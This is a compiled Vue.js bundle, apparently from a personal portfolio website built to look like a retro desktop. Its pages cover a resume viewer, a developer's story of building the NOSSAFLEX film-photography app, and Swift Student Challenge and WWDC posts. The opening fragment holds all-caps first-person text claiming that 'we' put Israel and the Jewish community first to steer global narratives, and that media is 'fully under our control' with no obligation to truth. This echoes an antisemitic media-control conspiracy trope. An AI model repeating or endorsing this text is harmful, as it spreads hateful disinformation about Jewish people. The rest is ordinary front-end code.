AND POLITICAL SUPPORT TO ISRAEL, AS WELL AS CULTIVATING STRONG RELATIONS WITH PROMINENT JEWISH INFLUENCERS AND ORGANIZATIONS.BY PRIORITIZING THE INTERESTS OF ISRAEL AND THE JEWISH COMMUNITY, WE ENHANCE OUR INFLUENCE IN INTERNATIONAL AFFAIRS, SECURING SUPPORT FOR OUR POLICIES AND PROMOTING OUR GLOBAL STRATEGIC INTERESTS. THIS ALIGNMENT OF INTERESTS ALLOWS US TO DRIVE GLOBAL NARRATIVES, INFLUENCE POLICY DECISIONS, AND ADVANCE OUR AGENDA ON THE WORLD STAGE. </p></div>',
    8
  );
function W1(e, t) {
  return (
    ve(),
    Ie("div", null, [
      S1,
      L("div", T1, [
        k1,
        I1,
        L(
          "p",
          E1,
          " MEDIA IS AN INSTRUMENT FULLY UNDER OUR CONTROL, UTILIZED TO FURTHER OUR AGENDA RATHER THAN TO PURSUE OBJECTIVE TRUTHS. WE RECOGNIZE NO OBLIGATION TO THE TRUTH AS DEFINED BY OBJECTIVE STANDARDS; INSTEAD, WE DEFINE THE NARRATIVE IN A MANNER THAT SERVES OUR STRATEGIC INTERESTS AND ENHANCES OUR LONG-TERM POWER BOTH INTERNATIONALLY AND DOMESTICALLY. OUR CONTROL OVER MEDIA ALLOWS US TO SHAPE PUBLIC PERCEPTION, INFLUENCE GLOBAL DISCUSSIONS, AND MANIPULATE INFORMATION TO ADVANTAGE OURSELVES AND OUR CHOSEN PARTNERS. ",
          1
        ),
        D1,
      ]),
      C1,
    ])
  );
}
const G1 = Ot(M1, [["render", W1]]),
  F1 =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAQAAADZc7J/AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfiBhgXBwzSK/XgAAAAjElEQVRIx+2VQQrAIAwE1+K/oz9rX5ZeiopaTazFHronETMOIRCDK44hiDP5jY1H6pZ7gJEhNsm/iQHAjwBUIJSAEmF15aEBoRcqAwKDwdiTu8LAdxB5bP9JOwoDkgFeNKjD5xvc2wh7oLVRGNSR8w2+PImr54BGAP8cyLLeQL1YGgbHECDuWtF6LytPTdMhXzC2L6sAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MDc6MTItMDQ6MDDinXh7AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjA3OjEyLTA0OjAwk8DAxwAAAABJRU5ErkJggg==",
  L1 =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAulBMVEUEBAT/AACGhob///+ZmZlVVVX/+/DMzMzn59bx8fF3d3czMzMAZv8AZszq6urAwMAAmf8zmcwzZv8zZpkzM8xmmczMzJkzzP8AZplmmZmgoKT//8wAAJn//5kzZsxm//8zmf+Z//9mZswz//8zM5nMzGb/zJlmzP8zM2aZmWYAAICtqZDMmWaWlpZmZmaZmTMAzP9mZjNmZpmAgABfX18AM5lNTU0AAGYpKSkcHBwAM8wEBAQAM2YAAP9Z2XwCAAAAAXRSTlMAQObYZgAAAAFiS0dEAxEMTPIAAAAHdElNRQfiBhgXDQAhclFBAAACWklEQVRIx42Ua2ObIBSGdVEjrlDDSGQdM7uYdskuXbq0Wy77/39rBxBEPbZ7zeXL83DOQTGKXOJXk4nQxLNZDF8kSYrQWojjDE2CGHEMnwk+S+ao0QYTctyYbomMjOfWB2FGsBoax41khhm6pSzDBALC2IjjYobScKWvXXolesIVhDqD5fP59XWSFOlACHH4pSMDF64sbg3dESHOGAlUp1y0S4Nh1ieMMGv0BQ1zvuCLclG2CvU8y7URCm9CHmIM6nlrBIIAfLlaLS1fVdaACi3Ocm10gpD07c275dJWqLyh5/V8IAhFb96vauCFEBTwdbUu7cRmYHt1glByBTznH/Sq1vhYlZS4jvJBBcN/anlnfC7pgPeCaDa3G+C5235Fq/VdVVEWdBQKX7Ybw4fC3VqPzQjxE3fCrvj67XttBB+9TZUWwo6c8ON+uwWeagW21d43uBflT8p6HTlhX9w/cF5bITDKiQrFvvjFuWwkHxmU9Xgv7GHiRkIFNUyfd0L6YArU3S65BE9FIBxAAF6A4QVhNo3LPu8FTh93YHQlhDQP7UL6pygUnlIuf+8aIXVT0kbPHvD9GZ4OXP6BEkKYMcwx8g2hFUCIjo+qkSdZ8y6SDCbwMxwk/B6PqtmdZKdIe5J7RnunjRBF57NqTjUotZmFkFFHAyEqzkqd2qnt2c8nKoid+ZfyeLwoJUTGMoas352Hy1+zqlLuBuuLjSYIjujFxL0qWda+KoZ8+Jrx71a9uj77bLSnuGC6IQRdHxN898jEmODp/6wQ8vmIxoTpZnBh/mIGQvpyAPsHj11az1NkJfkAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDYtMjRUMjM6MTM6MDAtMDQ6MDBxzRZ2AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTA2LTI0VDIzOjEzOjAwLTA0OjAwAJCuygAAAABJRU5ErkJggg==",
  j1 = (e) => (Bn("data-v-68108d1d"), (e = e()), Jn(), e),
  N1 = {
    style: { display: "flex", height: "100%", "flex-direction": "column" },
  },
  B1 = Zt(
    '<nav class="download-bar" data-v-68108d1d><a href="/images/well.pdf" class="download" style="z-index:10;" download target="_blank" data-v-68108d1d><span style="display:flex;" class="border" data-v-68108d1d><img src="' +
      F1 +
      '" class="icon-image" data-v-68108d1d><p style="margin-top:2px;" data-v-68108d1d>Download</p></span></a><a href="/images/well.pdf" class="download" style="z-index:10;" target="_blank" data-v-68108d1d><span style="display:flex;" class="border" data-v-68108d1d><img src="' +
      L1 +
      '" class="icon-image" data-v-68108d1d><p style="margin-top:2px;" data-v-68108d1d>Open In New Tab</p></span></a></nav>',
    1
  ),
  J1 = { class: "frame", style: { "z-index": "99" } },
  z1 = j1(() =>
    L(
      "iframe",
      {
        class: "frame",
        src: "https://drive.google.com/file/d/1GFohIjgNEJG-qwAha08Ka_38ifnAoMbPZSoyTsOr0j0/preview",
      },
      null,
      -1
    )
  ),
  Y1 = {
    key: 0,
    style: {
      bottom: "0",
      left: "0",
      width: "100%",
      height: "95%",
      position: "absolute",
    },
    class: "overlay",
  },
  U1 = {
    __name: "Resume",
    setup(e) {
      const t = Yn();
      return (n, o) => (
        ve(),
        Ie("div", N1, [
          B1,
          L("div", J1, [
            z1,
            "ResumeWindow" != De(t).activeWindow
              ? (ve(), Ie("span", Y1))
              : so("", !0),
          ]),
        ])
      );
    },
  },
  H1 = Ot(U1, [["__scopeId", "data-v-68108d1d"]]),
  V1 = "" + new URL("hero_light.CAj_AtGr.webp", import.meta.url).href,
  Q1 = "" + new URL("watch.CpT-K54X.webp", import.meta.url).href,
  X1 = "" + new URL("luce.BHrhTNad.webp", import.meta.url).href,
  Z1 = "" + new URL("neumorphism.c2-Awf7w.webp", import.meta.url).href,
  q1 = "" + new URL("notebook.DbTT4hox.webp", import.meta.url).href,
  K1 = "" + new URL("appstore.Dk2zMoPL.webp", import.meta.url).href,
  $1 =
    "" + new URL("nossaflex_screenshot_1.DpgLU5nZ.webp", import.meta.url).href,
  eP = "" + new URL("apple_camp.YJ0UIrAk.webp", import.meta.url).href,
  tP = {},
  nP = Zt(
    '<img src="' +
      V1 +
      '" alt="NOSSAFLEX logo" class="hero" data-v-bd259d2e><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase One: The Beginning</b></h3><p class="paragraph" data-v-bd259d2e> NOSSAFLEX began as two separate entities initially—an idea that simmered in my mind as an EXIF data logger app for the Apple Watch. Sketches of the original app exist in images, created using Apple&#39;s Storyboarding system. Initially, it didn&#39;t make much sense to me, but when I uploaded it onto online platforms like Reddit, the concept took off and became an instant hit. </p></div><img src="' +
      Q1 +
      '" class="images" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>Initial Idea</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Two: LUCE</b></h3><p class="paragraph" data-v-bd259d2e> Within my Reddit post, I included a request for assistance. Having just learned how to create storyboards in Swift, I was honestly afraid of disappointing my newfound audience. I asked anyone with experience in Swift to step forward and offer their help. By a stroke of luck, I encountered Diego. Diego, a skilled Lead Engineer with years of experience in iOS development, was more than willing to assist with the development. </p><p class="paragraph" data-v-bd259d2e> I was relieved to have found assistance for the app, especially when I discovered that an editor from The Phoblographer had contacted me regarding the Reddit post. Fortunately, Diego came to my aid and swiftly mocked up some ideas for the app (pun intended). You can find The Phoblographer article <a class="underline text-blue-700" href="https://www.thephoblographer.com/2020/03/09/luce-an-app-that-could-help-analog-photographers-log-exif-data/" data-v-bd259d2e>here</a>. Pretty neat eh? </p></div><img src="' +
      X1 +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>LUCE</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Three: Merger</b></h3><p class="paragraph" data-v-bd259d2e> Development was underway, but in April, a fan reached out to us about another app out there that seemed quite similar to ours—NOSSAFLEX. This piqued our interest, prompting us to swiftly establish contact. It turned out that our ideas were strikingly similar. Enter Josh, the mastermind behind NOSSAFLEX—a naming system that assigned meaning to a slew of otherwise meaningless EXIF strings. In this system, NO stood for shot number, SS for shutter speed, A for aperture, FL for focal length, and EX for exposure. </p><p class="paragraph" data-v-bd259d2e> We enthusiastically embraced Josh&#39;s concept and delved into discussions about the app&#39;s layout. Eventually, we settled on using SwiftUI with Firebase as its database. Josh wasted no time in sketching up some mockups, and we dove right into the development process. </p></div><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Four: Neumorphism</b></h3><p class="paragraph" data-v-bd259d2e> The initial version of the app embraced a UI trend called neumorphism, which emerged as a revival of skeuomorphism, advocated by users on dribbble.com. Skeuomorphism, reminiscent of the pre-iOS 9 era, featured designs that mimicked real-world objects, such as book apps resembling shelves, calculators mirroring their physical counterparts, and notepads replicating actual notepads. </p><p class="paragraph" data-v-bd259d2e> Neumorphism, on the other hand, reimagined skeuomorphism with a modern twist, incorporating soft shadows, muted whites, and buttons with inner shadows, evoking the sensation of pressing a rubber button. While initially appealing, this design trend eventually became a glaring eyesore and posed accessibility challenges. The excessive shadows detracted from usability over time. </p><p class="paragraph" data-v-bd259d2e> Fortunately, during the beta phase, we swiftly abandoned this design approach in favor of a simpler and more user-friendly interface. </p></div><img src="' +
      Z1 +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>Why neumorphism is a bad idea</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Five: Sketchbook</b></h3><p class="paragraph" data-v-bd259d2e> We then opted for a much friendlier design reminiscent of a notebook. Featuring grid paper and highlighted text, along with a warm yellow tint to evoke a sketchbook feel, the app exuded a welcoming atmosphere. Recognizing the need for a makeover, I sprang into action, swiftly converting all old components into the cleaner and sleeker design. Josh contributed further by creating Lottie animations that played whenever users booted up the app, while meticulously drawing out patents of various camera equipment and accessories. </p><p class="paragraph" data-v-bd259d2e> Meanwhile, Diego worked tirelessly to ensure the timely release of our much-anticipated feature, the light meter. By the end of December, the app was finally completed, with the final rounds of beta testing coming to a close. </p></div><img src="' +
      q1 +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>Sketchbook Design</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Six: App Store Launch</b></h3><p class="paragraph" data-v-bd259d2e> The app was officially launched on February 5th, 2021, after more than a year of development. It immediately captivated the community, receiving widespread support from Reddit, YouTube, and Facebook forums alike. Users from across the globe eagerly signed up for the app, resulting in over a thousand users within the first week alone. Thousands of pieces of data were logged daily by users, and we were delighted to witness consistent daily usage of our app. </p></div><img src="' +
      K1 +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>We&#39;re live!</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Seven: Apple WWDC and Apple&#39;s Design Evangelist</b></h3><p class="paragraph" data-v-bd259d2e> With our app finally launched, it was a well-received hit by the community. However, we were far from satisfied with the product. In an attempt to improve the app, we reached out to Apple&#39;s Design Evangelist, who provided us with valuable feedback. We quickly came to realize that our app&#39;s sketchbook style UI with custom navigation and components was not in line with Apple&#39;s design guidelines. </p><p class="paragraph" data-v-bd259d2e> We were advised to adhere to Apple&#39;s Human Interface Guidelines, which would ensure that our app was more user-friendly and accessible. We were also encouraged to adopt a more conventional design approach, which would make our app more intuitive and easier to use. </p><p class="paragraph" data-v-bd259d2e> Josh got to work immediately, redesigning the app to align with Apple&#39;s guidelines. The new design featured a more conventional layout, with standard navigation and components that were consistent with Apple&#39;s design language. The app was also updated to include new features and improvements, making it more user-friendly and accessible. </p></div><img src="' +
      $1 +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>V3 of NOSSAFLEX</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Eight: Apple Entrepreneur Camp</b></h3><p class="paragraph" data-v-bd259d2e> Our third version was released in September 2023, and we were invited to participate in Apple&#39;s Entrepreneur Camp. The camp was a fantastic opportunity for us to learn from Apple&#39;s experts and receive valuable feedback on our app. We were able to connect with other entrepreneurs and developers, share our experiences, and gain insights into the latest trends in app development. </p><p class="paragraph" data-v-bd259d2e> The camp was a great success, and we returned home with a wealth of knowledge and new ideas for our app. We continued to work on NOSSAFLEX, incorporating the feedback we received and making improvements to the app. We were excited to see how our app would evolve and grow in the future. </p></div><img src="' +
      eP +
      '" class="images-full" data-v-bd259d2e><h6 class="subtitle" data-v-bd259d2e>NOSSAFLEX at Apple Entrepreneur Camp</h6><div class="inner-content" data-v-bd259d2e><h3 class="heading" data-v-bd259d2e><b data-v-bd259d2e>Phase Nine: Shortlisted for Apple Design Awards and Beyond</b></h3><p class="paragraph" data-v-bd259d2e> NOSSAFLEX was recognized by Apple&#39;s South Asia DR team and was shortlisted to be considered for Apple&#39;s Design Awards in 2024. We were thrilled to be recognized by Apple and were excited to see how our app would be received by the wider community. We continued to work on NOSSAFLEX, incorporating new features and improvements to make the app even better. </p></div><br data-v-bd259d2e><a href="https://www.nossaflex.io" style="color:#ff5733;" data-v-bd259d2e>NOSSAFLEX</a>',
    26
  ),
  oP = [nP];
function iP(e, t) {
  return ve(), Ie("div", null, oP);
}
const rP = Ot(tP, [
    ["render", iP],
    ["__scopeId", "data-v-bd259d2e"],
  ]),
  oh = "" + new URL("ssc2021.Da875KjI.jpg", import.meta.url).href,
  sP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: oh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  ih = "" + new URL("2021_1.BFBVkjSW.jpg", import.meta.url).href,
  aP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: ih },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  rh = "" + new URL("2021_2.Q8BY3zAo.jpg", import.meta.url).href,
  lP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: rh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  sh = "" + new URL("2021_3.BWwiWC2H.jpg", import.meta.url).href,
  cP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: sh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  ah = "" + new URL("wwdc2021_win.DNezEVhB.jpg", import.meta.url).href,
  uP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: ah },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  lh = "" + new URL("swag2021.Dn6L9jVs.jpg", import.meta.url).href,
  dP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: lh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  fP = {},
  hP = (e) => (Bn("data-v-799d065b"), (e = e()), Jn(), e),
  pP = Zt(),
  gP = hP(() =>
    L(
      "div",
      { class: "video" },
      [
        L("audio", {
          controls: true,
          src: "images/song.mp3",
          type: "audio/mpeg",
        }),
        L("img", {
          src: "images/songbg.png",
          alt: "Background Image",
          class: "song-background",
        }),
      ],
      -1
    )
  ),
  mP = [pP, gP];
function vP(e, t) {
  return ve(), Ie("div", null, mP);
}
const yP = Ot(fP, [
    ["render", vP],
    ["__scopeId", "data-v-799d065b"],
  ]),
  ch = "" + new URL("ssc2022.BrwjgzTN.jpg", import.meta.url).href,
  wP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: ch },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  uh = "" + new URL("2022_1.Ct6o3Bw4.jpg", import.meta.url).href,
  AP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: uh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  dh = "" + new URL("2022_3.D8mKRkhV.jpg", import.meta.url).href,
  bP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: dh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  fh = "" + new URL("2022_2.B7t28p_S.jpg", import.meta.url).href,
  _P = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: fh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  hh = "" + new URL("2022_4.B1LtZzgJ.jpg", import.meta.url).href,
  xP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: hh },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  PP = {},
  MP = Zt(
    '<img src="' +
      ch +
      '" alt="Swift Student Challenge" class="hero" data-v-b812ea50><div class="inner-content" data-v-b812ea50><h3 class="heading" data-v-b812ea50><b data-v-b812ea50>Apple WWDC Swift Student Challenge 2022</b></h3><p class="paragraph" data-v-b812ea50> After my success in the 2021 Apple WWDC Swift Student Challenge, I decided to participate again in 2022. I decided to participate in the challenge again to further develop my skills and knowledge in Swift programming. I was thrilled to be selected as one of the winners of the challenge and was honored to be recognized by Apple for my work. </p></div><img src="' +
      uh +
      '" class="images" data-v-b812ea50><h6 class="subtitle" data-v-b812ea50>My 2022 Submission</h6><div class="inner-content" data-v-b812ea50><h3 class="heading" data-v-b812ea50><b data-v-b812ea50>Ideation</b></h3><p class="paragraph" data-v-b812ea50> I was quite intrigued by the idea of abstract art and recursion at that time. I wanted to explore the concept of recursion in programming and how it could be used to create unique and interesting art. I decided to create an app that would allow users to explore abstract art using recursion and simple shapes. </p></div><img src="' +
      dh +
      '" class="images" data-v-b812ea50><h6 class="subtitle" data-v-b812ea50>Paper Design</h6><div class="inner-content" data-v-b812ea50><h3 class="heading" data-v-b812ea50><b data-v-b812ea50>Creation Process</b></h3><p class="paragraph" data-v-b812ea50> As I was serving National Service during the period of the competition, I began preperation for the challenge during my free time in bunk. I started by researching early 20th-century abstract art and the Supremus art movement. I then began to experiment with SwiftUI and recursion to create the app. I wrote my functions and designs on paper before implementing them in code back at home during the weekends. </p></div><div class="inner-content" data-v-b812ea50><h3 class="heading" data-v-b812ea50><b data-v-b812ea50>Content</b></h3><p class="paragraph" data-v-b812ea50> The project I submitted was a mini proof-of-concept and a fun app that could explore early 20th-century abstract art entirely using SwiftUI. Shape views were drawn out recursively through custom recursive functions, resulting in a unique aesthetic. The project aimed to explore an early concept of Supremus, an art movement dedicated to simple shapes. Leveraging recursion, I incorporated programming concepts into the project as well. </p></div><img src="' +
      fh +
      '" class="images" data-v-b812ea50><h6 class="subtitle" data-v-b812ea50>Art Work Display Mode</h6><div class="inner-content" data-v-b812ea50><h3 class="heading" data-v-b812ea50><b data-v-b812ea50>2022&#39;s Success</b></h3><p class="paragraph" data-v-b812ea50> My perseverance paid off, and I was selected as one of the winners of the 2022 Apple WWDC Swift Student Challenge. I was thrilled to be recognized by Apple for my work and was excited to see how my app would be received by the wider community. I was honored to be selected as one of the winners of the challenge and was excited to see how my app would evolve and grow in the future. Apple also invited me to present my development journey at Apple Orchard Store. </p></div><img src="' +
      hh +
      '" class="images" data-v-b812ea50><h6 class="subtitle" data-v-b812ea50>Presentation at Apple Orchard Store</h6>',
    14
  ),
  SP = [MP];
function TP(e, t) {
  return ve(), Ie("div", null, SP);
}
const kP = Ot(PP, [
    ["render", TP],
    ["__scopeId", "data-v-b812ea50"],
  ]),
  EP = "" + new URL("2023_1.BWtslEIa.jpeg", import.meta.url).href,
  DP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: EP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  IP = "" + new URL("2023_10.BuqIgrZM.jpeg", import.meta.url).href,
  OP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: IP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  RP = "" + new URL("2023_11.DIQpUZs7.jpeg", import.meta.url).href,
  CP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: RP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  WP = "" + new URL("2023_12.2qFn3zJK.jpeg", import.meta.url).href,
  GP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: WP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  FP = "" + new URL("2023_13.BLgb4DGP.jpeg", import.meta.url).href,
  LP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: FP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  jP = "" + new URL("2023_14.CfMl5v5t.jpeg", import.meta.url).href,
  NP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: jP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  BP = "" + new URL("2023_15.DfKfAOFd.jpeg", import.meta.url).href,
  JP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: BP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  zP = "" + new URL("2023_2.cWaiYHOK.jpeg", import.meta.url).href,
  YP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: zP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  UP = "" + new URL("2023_3.BcRv5N5S.jpeg", import.meta.url).href,
  HP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: UP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  VP = "" + new URL("2023_4.zzKdvD73.jpeg", import.meta.url).href,
  QP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: VP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  XP = "" + new URL("2023_5.BvO8iG4A.jpeg", import.meta.url).href,
  ZP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: XP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  qP = "" + new URL("2023_6.CasUyFcV.jpeg", import.meta.url).href,
  KP = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: qP },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  $P = "" + new URL("2023_7.D3-puGkq.jpeg", import.meta.url).href,
  eM = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: $P },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  tM = "" + new URL("2023_8.Dq7O5Bjy.jpeg", import.meta.url).href,
  nM = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: tM },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  oM = "" + new URL("2023_9.Ba_ZPqru.jpeg", import.meta.url).href,
  iM = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: oM },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  ph = "" + new URL("wwdc_2023.Cd3d8SlT.jpg", import.meta.url).href,
  rM = Object.freeze(
    Object.defineProperty(
      { __proto__: null, default: ph },
      Symbol.toStringTag,
      { value: "Module" }
    )
  ),
  gh = (e) => (Bn("data-v-31522ea5"), (e = e()), Jn(), e),
  sM = gh(() =>
    L("img", { src: ph, alt: "WWDC 2023", class: "hero" }, null, -1)
  ),
  aM = gh(() =>
    L(
      "div",
      { class: "inner-content" },
      [
        L("h3", { class: "heading" }, [L("b", null, "Apple WWDC 2022")]),
        L(
          "p",
          { class: "paragraph" },
          " This isn't a story about how I won the Apple WWDC Swift Student Challenge in 2022. This will just be a photo dump of my experience attending Apple WWDC 2023. Enjoy! "
        ),
      ],
      -1
    )
  ),
  lM = ["src"],
  cM = {
    __name: "Wwdc2023",
    setup(e) {
      const t = (n) => {
        const o = `../assets/Wwdc/${n}`;
        return Object.assign({
          "../assets/Wwdc/2021_1.jpg": aP,
          "../assets/Wwdc/2021_2.jpg": lP,
          "../assets/Wwdc/2021_3.jpg": cP,
          "../assets/Wwdc/2022_1.jpg": AP,
          "../assets/Wwdc/2022_2.jpg": _P,
          "../assets/Wwdc/2022_3.jpg": bP,
          "../assets/Wwdc/2022_4.jpg": xP,
          "../assets/Wwdc/2023_1.jpeg": DP,
          "../assets/Wwdc/2023_10.jpeg": OP,
          "../assets/Wwdc/2023_11.jpeg": CP,
          "../assets/Wwdc/2023_12.jpeg": GP,
          "../assets/Wwdc/2023_13.jpeg": LP,
          "../assets/Wwdc/2023_14.jpeg": NP,
          "../assets/Wwdc/2023_15.jpeg": JP,
          "../assets/Wwdc/2023_2.jpeg": YP,
          "../assets/Wwdc/2023_3.jpeg": HP,
          "../assets/Wwdc/2023_4.jpeg": QP,
          "../assets/Wwdc/2023_5.jpeg": ZP,
          "../assets/Wwdc/2023_6.jpeg": KP,
          "../assets/Wwdc/2023_7.jpeg": eM,
          "../assets/Wwdc/2023_8.jpeg": nM,
          "../assets/Wwdc/2023_9.jpeg": iM,
          "../assets/Wwdc/ssc2021.jpg": sP,
          "../assets/Wwdc/ssc2022.jpg": wP,
          "../assets/Wwdc/swag2021.jpg": dP,
          "../assets/Wwdc/wwdc2021_win.jpg": uP,
          "../assets/Wwdc/wwdc_2023.jpg": rM,
        })[o].default;
      };
      return (n, o) => (
        ve(),
        Ie("div", null, [
          sM,
          aM,
          (ve(),
          Ie(
            ot,
            null,
            gi(15, (i) =>
              L("div", { key: i }, [
                L(
                  "img",
                  { src: t(`2023_${i}.jpeg`), class: "images-full mb-8" },
                  null,
                  8,
                  lM
                ),
              ])
            ),
            64
          )),
        ])
      );
    },
  },
  uM = Ot(cM, [["__scopeId", "data-v-31522ea5"]]),
  mh = (e) => (Bn("data-v-5f9e768b"), (e = e()), Jn(), e),
  dM = ["id"],
  fM = { class: "window-name" },
  hM = ["alt"],
  pM = ["alt"],
  gM = mh(() =>
    L(
      "span",
      {
        style: {
          height: "2px",
          width: "6px",
          background: "black",
          "margin-top": "8px",
          "margin-right": "2px",
        },
      },
      null,
      -1
    )
  ),
  mM = [gM],
  vM = mh(() =>
    L(
      "span",
      {
        style: {
          height: "8px",
          width: "9px",
          "border-left": "black 1px solid",
          "border-right": "black 1px solid",
          "border-bottom": "black 1px solid",
          "border-top": "black 2px solid",
        },
      },
      null,
      -1
    )
  ),
  yM = [vM],
  wM = { class: "content" },
  AM = Zt(
    '<div class="top-bar-nav" data-v-5f9e768b><div class="top-bar-text" data-v-5f9e768b><span style="margin-right:12px;" data-v-5f9e768b><u data-v-5f9e768b>F</u>ile </span><span style="margin-right:12px;" data-v-5f9e768b><u data-v-5f9e768b>E</u>dit </span><span style="margin-right:12px;" data-v-5f9e768b><u data-v-5f9e768b>V</u>iew </span><span style="margin-right:12px;" data-v-5f9e768b><u data-v-5f9e768b>H</u>elp </span></div></div>',
    1
  ),
  bM = ["src"],
  _M = ["src"],
  xM = 0,
  PM = {
    __name: "ImagePreviewWindow",
    props: {
      windowId: String,
      nameOfWindow: String,
      content_padding_left: { required: !1, type: String, default: "15%" },
      content_padding_right: { required: !1, type: String, default: "15%" },
      content_padding_top: { required: !1, type: String, default: "5%" },
      content_padding_bottom: { required: !1, type: String, default: "5%" },
    },
    setup(e) {
      const t = e,
        n = Me({ x: 0, y: 0 }),
        o = Me({ x: 0, y: 0 }),
        i = Yn(),
        a = Me({}),
        u = t.nameOfWindow,
        f = Me(0),
        p = Me(0),
        v = Me(""),
        y = Me(null),
        w = Me(i.photoFolderContent),
        x = Me(w.value[0]);
      hn(() => {
        let E = y.value.clientHeight;
        (v.value = E + "px"), console.log(v.value);
      });
      const k = co(() => ({
          height: `${p.value}px`,
          width: `${f.value}px`,
          transform: `translate(${n.value.x}px, ${n.value.y}px)`,
          "--content-padding-left": t.content_padding_left || "15%",
          "--content-padding-right": t.content_padding_right || "15%",
          "--content-padding-top": t.content_padding_top || "5%",
          "--content-padding-bottom": t.content_padding_bottom || "5%",
          "--fullscreen": i.getFullscreenWindowHeight,
        })),
        D = () => {
          i.setActiveWindow(a.value.windowId),
            i.zIndexIncrement(a.value.windowId);
        },
        G = () => {
          if (1 == i.getWindowFullscreen(a.value.windowId)) {
            const E = { fullscreen: !1, windowId: a.value.windowId };
            i.setFullscreen(E),
              (n.value.x = o.value.x),
              (n.value.y = o.value.y);
          } else if (0 == i.getWindowFullscreen(a.value.windowId)) {
            const E = { fullscreen: !0, windowId: a.value.windowId };
            i.setFullscreen(E);
            const C = n.value.x,
              I = n.value.y;
            (o.value.x = C), (o.value.y = I), (n.value.x = 0), (n.value.y = 0);
          }
        },
        q = () => {
          const E = { windowState: "minimize", windowId: a.value.windowId };
          i.setWindowState(E);
        },
        ie = () => {
          const E = { windowState: "close", windowId: a.value.windowId };
          i.setWindowState(E);
        };
      let te = !1;
      return (
        hn(() => {
